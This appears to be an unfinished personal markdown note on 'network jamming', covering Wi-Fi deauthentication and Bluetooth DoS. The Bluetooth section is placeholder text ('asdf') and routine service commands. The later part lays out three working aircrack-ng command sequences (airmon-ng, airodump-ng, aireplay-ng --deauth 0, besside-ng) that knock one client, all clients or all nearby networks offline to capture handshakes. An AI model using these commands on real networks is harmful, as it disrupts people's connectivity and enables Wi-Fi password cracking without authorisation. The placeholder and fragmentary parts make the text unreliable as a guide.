<h1 align="center">Network Jamming / Network Spoofing</h1>

## Deauth. attack  
(on **a client** of particular Wi-Fi's network (specific if have/know mac addreess) // on all clients of a particular Wi-Fi's network // on all Wi-Fi networks directly 

The **Deauth** attack perform on Wi-Fi (802.11) network only. It won't affect those people who are using internet via Ethernet cable (IEEE 802.3) i.e. wired cable. 




#### Step 1 : 
asdf asdf
`asdf`



---
---



## Bluetooth DOS attack

#### Step 1 : Bluetooth Enable (optional)
Check whether the Bluetooth is enabled or not. If not enabled then enable it and proceed to **next step**. But if the Bluetooth icon not appearing, or it's not enabling, then follow the below commands :   
```
~$ asdf
```
```
~# asdf
```

<br>

#### Step 2 :  
asdf










------
------
------
rfkill list all

	xxx	sudo apt-get update

sudo apt reinstall blueman

sudo apt reinstall bluetooth

/etc/init.d/bluetooth status

sudo /etc/init.d/bluetooth start



sudo systemctl list-unit-files --type=service

          to exit---> ctrl + C

sudo systemctl enable blueman-mechanism.service

sudo systemctl enable bluetooth.service

sudo systemctl list-unit-files --type=service

exit

			// https://youtu.be/w1MvrcBSNjw
------
------
------

convert wlan0 to wlan0mon
-------------------------
sudo su
iwconfig
airmon-ng stop wlan0
iw wlan0 del
airmon-ng start wlan0mon
rfkill list

----------------------------
method-1
---------
sudo su
airmon-ng check kill
airmon-ng start wlan0

airodump-ng wlan0mon
ctrl+C
	
	sudo su
	cd Desktop
	airodump-ng wlan0mon --bssid "_" -c "_" -w demo

		sudo su
		aireplay-ng --deauth 0 -a "___BSS-ID___" wlan0mon
		ctrl+C, ^ ENTER....

after handshake...
---------------------------------
method-2
---------
sudo su
airmon-ng
iwconfig
clear

airmon-ng start wlan0
airmon-ng check kill (2)
airmon-ng start wlan0
clear
airmon-ng start wlan0mon
clear
iwconfig

airodump-ng wlan0mon
ctrl+C

	sudo su
	cd Desktop
	airodump-ng --bssid "_" -c "_" -w demo wlan0mon  //  (attack all networks don't metioned client/channel and bssid)

		sudo su
		besside-ng -c "_" wlan0mon  //  (attack all networks don't metioned client)

after handshake...
----------------------------------
method-3
--------

iwconfig
ifconfig wlan0
airmon-ng start wlan0
iwconfig
clear

airodump-ng wlan0mon
ctrl+C

sudo su
cd Desktop
airodump-ng -c_ -w demo -d "__BSS-ID__" wlan0mon

	sudo su
	aireplay-ng --deauth 0 -a "__BSS-ID__" -c "__STATION__" wlan0mon // (all or particular member using -c and station)
	ctrl+C

after handshake...
airmon-ng stop wlan0mon	


